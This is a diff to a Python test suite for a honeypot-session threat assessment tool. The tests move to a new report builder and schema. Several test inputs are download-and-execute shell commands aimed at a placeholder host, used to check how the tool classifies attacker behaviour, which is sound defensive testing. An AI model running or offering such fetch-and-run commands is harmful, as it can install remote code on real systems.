@@ -11,7 +11,7 @@ from production.policies.threat_hypothesis_behavior_policy import (
     resolve_behavior_policy,
     validate_behavior_policy,
 )
-from production.reporting.threat_hypothesis import build_v2_report
+from production.reporting.session_assessment_v4 import build_session_assessment_v4
 
 
 PROJECT_ROOT = Path(__file__).resolve().parents[1]
@@ -40,18 +40,19 @@ def _session_report(commands: list[str], *, policy_document: dict | None = None)
         "classification_events": [],
         "raw_events": events,
     }
-    return build_v2_report(
-        {},
+    return build_session_assessment_v4(
         [payload],
         raw_events=events,
         behavior_policy_document=policy_document,
+        behavior_policy_path=str(TRUSTED_POLICY_PATH),
+        classification_policy_path="configs/classification_rules.trusted.json",
     )
 
 
-def _claim_types(report: dict) -> set[str]:
+def _finding_types(report: dict) -> set[str]:
     return {
-        str(claim.get("claim_type") or "")
-        for claim in report["supported_assessment"]["possible_objectives"]
+        str(finding.get("finding_type") or "")
+        for finding in report["behavioral_findings"]
     }
 
 
@@ -110,14 +111,10 @@ def test_invalid_in_memory_policy_fails_closed_without_behavior_claims() -> None
         ["curl https://example.invalid/a.sh | sh"],
         policy_document=policy,
     )
-    assert report["behavior_policy"]["enabled"] is False
-    assert report["observed_behavior"]["ordered_command_observations"]
-    assert all(
-        not observation["action_types"]
-        for observation in report["observed_behavior"]["ordered_command_observations"]
-    )
-    assert report["supported_assessment"]["possible_objectives"] == []
-    assert report["follow_on_hypothesis"]["abstained"] is True
+    assert report["status"] == "observation_only_abstention"
+    assert report["canonical_evidence"]["observations"]
+    assert report["behavioral_findings"] == []
+    assert report["hypothesis_sets"] == []
 
 
 def test_malformed_explicit_policy_fails_closed_without_substitution(tmp_path: Path) -> None:
@@ -143,14 +140,10 @@ def test_disabled_policy_retains_direct_events_but_suppresses_behavior_claims() 
         ["curl https://example.invalid/a.sh -o /tmp/a.sh", "sh /tmp/a.sh"],
         policy_document=policy,
     )
-    assert report["behavior_policy"]["enabled"] is False
-    assert len(report["observed_behavior"]["cowrie_event_evidence"]) == 2
-    assert all(
-        not observation["action_types"]
-        for observation in report["observed_behavior"]["ordered_command_observations"]
-    )
-    assert report["observed_behavior"]["connected_behavior_chains"] == []
-    assert report["supported_assessment"]["possible_objectives"] == []
+    assert report["status"] == "observation_only_abstention"
+    assert len(report["canonical_evidence"]["direct_cowrie_events"]) == 2
+    assert report["behavioral_findings"] == []
+    assert report["hypothesis_sets"] == []
 
 
 def test_new_remote_executable_can_be_added_without_python_changes() -> None:
@@ -159,7 +152,7 @@ def test_new_remote_executable_can_be_added_without_python_changes() -> None:
         "sh /tmp/a.sh",
     ]
     default_report = _session_report(commands)
-    assert "connected_transfer_execution" not in _claim_types(default_report)
+    assert "connected_transfer_execution" not in _finding_types(default_report)
 
     policy = _policy()
     policy["policy"]["extraction"]["remote_content_executables"]["fetch"] = {
@@ -171,15 +164,11 @@ def test_new_remote_executable_can_be_added_without_python_changes() -> None:
     assert validate_behavior_policy(policy) == []
 
     report = _session_report(commands, policy_document=policy)
-    assert "connected_transfer_execution" in _claim_types(report)
-    observations = report["observed_behavior"]["ordered_command_observations"]
-    assert observations[0]["action_types"] == ["remote_content_access", "transfer_attempt"]
-    assert observations[1]["action_types"] == ["execution_attempt"]
-    assert {
-        relationship["relationship_type"]
-        for relationship in report["observed_behavior"]["behavior_relationships"]
-    } >= {"artifact_execution"}
-    assert report["behavior_policy"]["load_status"] == "provided"
+    assert "connected_transfer_execution" in _finding_types(report)
+    observations = report["canonical_evidence"]["observations"]
+    assert len(observations) == 2
+    assert report["canonical_evidence"]["connected_behavior_chains"]
+    assert report["provenance"]["behavior_policy"]["load_status"] == "provided"
 
 
 def test_connected_claim_precedence_can_be_extended_without_python_changes() -> None:
@@ -200,16 +189,18 @@ def test_connected_claim_precedence_can_be_extended_without_python_changes() -> 
         ["curl https://example.invalid/a.sh -o /tmp/a.sh", "sh /tmp/a.sh"],
         policy_document=policy,
     )
-    claim = report["supported_assessment"]["connected_behavior_claims"][0]
-    assert claim["claim_type"] == "reviewed_transfer_execution_observation"
-    assert claim["behavior_policy_rule_id"] == "reviewed-transfer-execution-test-rule"
-    assert claim["evidence_status"] == "partially_supported"
+    finding = report["behavioral_findings"][0]
+    assert finding["finding_type"] == "reviewed_transfer_execution_observation"
+    assert finding["behavior_policy_rule_id"] == (
+        "reviewed-transfer-execution-test-rule"
+    )
 
 
 def test_policy_provenance_is_exposed_across_canonical_sections() -> None:
     report = _session_report(["curl https://example.invalid/a.sh -o /tmp/a.sh"])
-    expected = report["behavior_policy"]
+    expected = report["provenance"]["behavior_policy"]
     assert expected["policy_id"] == "cowrie-ssh-threat-hypothesis-behavior"
-    assert report["observed_behavior"]["behavior_policy"] == expected
-    assert report["supported_assessment"]["behavior_policy"] == expected
-    assert report["follow_on_hypothesis"]["behavior_policy"] == expected
+    assert expected["sha256"]
+    assert report["canonical_evidence"]["evidence_sha256"] == (
+        report["provenance"]["evidence_sha256"]
+    )
